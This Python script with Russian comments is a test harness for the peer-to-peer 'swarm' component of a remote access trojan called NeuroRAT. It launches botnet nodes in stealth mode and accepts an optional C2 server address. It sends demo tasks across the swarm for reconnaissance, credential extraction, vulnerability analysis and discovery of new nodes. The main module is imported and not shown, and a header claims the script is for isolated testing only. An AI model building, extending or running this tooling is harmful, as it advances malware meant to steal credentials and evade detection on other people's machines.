#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NeuroRAT Swarm Intelligence Test Script
---------------------------------------
Скрипт для безопасного тестирования роевого интеллекта в изолированной среде.

⚠️ ВАЖНО: Этот скрипт предназначен ТОЛЬКО для демонстрации возможностей в
изолированной среде (например, Docker). Не запускайте в производственных системах.

Автор: Mr. Thomas Anderson (iamtomasanderson@gmail.com)
"""

import os
import sys
import time
import json
import random
import logging
import socket
import argparse
import threading
from typing import Dict, List, Any, Optional

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("SwarmTest")

# Добавляем текущую директорию в путь импорта
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Импортируем модуль роевого интеллекта
try:
    from agent_modules.swarm_intelligence import SwarmNode, ConsensusEngine, TaskDistributor
    SWARM_MODULE_AVAILABLE = True
except ImportError:
    logger.error("Модуль роевого интеллекта не найден! Убедитесь, что файл agent_modules/swarm_intelligence.py существует.")
    SWARM_MODULE_AVAILABLE = False

class SwarmTester:
    """
    Класс для тестирования роевого интеллекта в изолированной среде.
    """
    
    def __init__(
        self,
        node_id: str,
        port: int,
        bootstrap_nodes: List[str] = None,
        is_bootstrap: bool = False,
        server_address: Optional[str] = None,
        stealth_mode: bool = True,
        log_level: str = "INFO"
    ):
        """
        Инициализация тестера.
        
        Args:
            node_id: Идентификатор узла
            port: Порт для прослушивания
            bootstrap_nodes: Список начальных узлов для подключения
            is_bootstrap: Является ли узел начальной точкой сети
            server_address: Адрес C2 сервера (опционально)
            stealth_mode: Включить режим скрытности
            log_level: Уровень логирования
        """
        self.node_id = node_id
        self.port = port
        self.bootstrap_nodes = bootstrap_nodes or []
        self.is_bootstrap = is_bootstrap
        self.server_address = server_address
        self.stealth_mode = stealth_mode
        
        # Настройка уровня логирования
        numeric_level = getattr(logging, log_level.upper(), None)
        if isinstance(numeric_level, int):
            logging.getLogger().setLevel(numeric_level)
        
        # Переменные для работы
        self.swarm_node = None
        self.running = False
        self.demo_tasks = [
            {"type": "reconnaissance", "data": {"target_type": "system"}},
            {"type": "data_extraction", "data": {"data_type": "credentials"}},
            {"type": "system_analysis", "data": {"analysis_type": "vulnerabilities"}}
        ]
        self.demo_proposals = [
            {"type": "data_collection", "data": {"target_type": "system_info"}},
            {"type": "stealth_adjustment", "data": {"stealth_level": 0.8}},
            {"type": "network_scan", "data": {"scan_type": "discover_nodes"}}
        ]
    
    def start(self) -> bool:
        """
        Запускает тестирование.
        
        Returns:
            bool: Успешность запуска
        """
        if not SWARM_MODULE_AVAILABLE:
            logger.error("Невозможно запустить тест: модуль роевого интеллекта недоступен.")
            return False
        
        logger.info(f"Запуск тестирования роевого интеллекта. Узел: {self.node_id}, Порт: {self.port}")
        self.running = True
        
        try:
            # Инициализация узла роевого интеллекта
            self.swarm_node = SwarmNode(
                node_id=self.node_id,
                listen_port=self.port,
                bootstrap_nodes=self.bootstrap_nodes,
                discovery_enabled=True,
                stealth_mode=self.stealth_mode,
                agent_context={
                    "node_type": "bootstrap" if self.is_bootstrap else "regular",
                    "server_connection": bool(self.server_address)
                }
            )
            
            # Запуск узла
            success = self.swarm_node.start()
            if not success:
                logger.error("Не удалось запустить узел роевого интеллекта.")
                return False
            
            # Подключение к C2 серверу, если указан
            if self.server_address:
                logger.info(f"Подключение к C2 серверу: {self.server_address}")
                # Здесь мог бы быть код для подключения к C2 серверу
            
            # Запуск демонстрационных потоков
            if self.is_bootstrap:
                # Bootstrap узел запускает демонстрационные задачи
                threading.Thread(target=self._demo_thread, daemon=True).start()
            
            # Запуск основного цикла
            self._main_loop()
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка при запуске тестирования: {str(e)}")
            self.running = False
            return False
    
    def stop(self):
        """Останавливает тестирование."""
        logger.info("Останавливаем тестирование роевого интеллекта...")
        self.running = False
        
        if self.swarm_node:
            self.swarm_node.stop()
        
        logger.info("Тестирование роевого интеллекта остановлено.")
    
    def _main_loop(self):
        """Основной цикл работы."""
        logger.info("Запуск основного цикла...")
        
        try:
            while self.running:
                # Просто поддерживаем работу узла активной
                time.sleep(1)
                
                # Периодически выводим статус
                if random.random() < 0.05:  # ~5% шанс каждую секунду
                    if self.swarm_node:
                        connected_count = len(self.swarm_node.connected_nodes)
                        logger.info(f"Статус узла {self.node_id}: {connected_count} подключенных узлов")
        
        except KeyboardInterrupt:
            logger.info("Получен сигнал прерывания, останавливаем...")
            self.stop()
        except Exception as e:
            logger.error(f"Ошибка в основном цикле: {str(e)}")
            self.stop()
    
    def _demo_thread(self):
        """Поток для демонстрации возможностей роевого интеллекта."""
        logger.info("Запуск демонстрационного потока...")
        
        # Даем время на инициализацию сети
        time.sleep(20)
        
        try:
            # Демонстрация создания задач
            logger.info("Демонстрация: Создание задач для распределения в рое")
            for i, task_info in enumerate(self.demo_tasks):
                if not self.running or not self.swarm_node:
                    break
                
                logger.info(f"Создание задачи #{i+1}: {task_info['type']}")
                task_id = self.swarm_node.task_distributor.create_task(
                    task_type=task_info["type"],
                    task_data=task_info["data"]
                )
                logger.info(f"Задача создана с ID: {task_id}")
                
                # Пауза между задачами
                time.sleep(10)
            
            # Демонстрация механизма консенсуса
            logger.info("Демонстрация: Механизм консенсуса для принятия решений")
            for i, proposal_info in enumerate(self.demo_proposals):
                if not self.running or not self.swarm_node:
                    break
                
                logger.info(f"Создание предложения #{i+1}: {proposal_info['type']}")
                proposal_id = self.swarm_node.consensus_engine.propose_action(
                    action_type=proposal_info["type"],
                    action_data=proposal_info["data"]
                )
                logger.info(f"Предложение создано с ID: {proposal_id}")
                
                # Пауза между предложениями
                time.sleep(15)
            
            logger.info("Демонстрационный поток завершен.")
            
        except Exception as e:
            logger.error(f"Ошибка в демонстрационном потоке: {str(e)}")

def parse_arguments():
    """Парсинг аргументов командной строки."""
    parser = argparse.ArgumentParser(description='Тестер роевого интеллекта NeuroRAT')
    parser.add_argument('--node-id', type=str, required=True, help='Идентификатор узла')
    parser.add_argument('--port', type=int, required=True, help='Порт для прослушивания')
    parser.add_argument('--bootstrap', type=str, help='Адрес bootstrap узла (например, 192.168.1.10:8443)')
    parser.add_argument('--is-bootstrap', action='store_true', help='Является ли узел bootstrap узлом')
    parser.add_argument('--server', type=str, help='Адрес C2 сервера (опционально)')
    parser.add_argument('--stealth', action='store_true', default=True, help='Включить режим скрытности')
    parser.add_argument('--log-level', type=str, default='INFO', help='Уровень логирования')
    
    return parser.parse_args()

def main():
    """Основная функция."""
    # Парсим аргументы
    args = parse_arguments()
    
    # Формируем список bootstrap узлов
    bootstrap_nodes = []
    if args.bootstrap:
        bootstrap_nodes.append(args.bootstrap)
    
    # Создаем и запускаем тестер
    tester = SwarmTester(
        node_id=args.node_id,
        port=args.port,
        bootstrap_nodes=bootstrap_nodes,
        is_bootstrap=args.is_bootstrap,
        server_address=args.server,
        stealth_mode=args.stealth,
        log_level=args.log_level
    )
    
    # Запускаем тестирование
    success = tester.start()
    if not success:
        logger.error("Не удалось запустить тестирование.")
        return 1
    
    return 0

if __name__ == "__main__":
    sys.exit(main()) 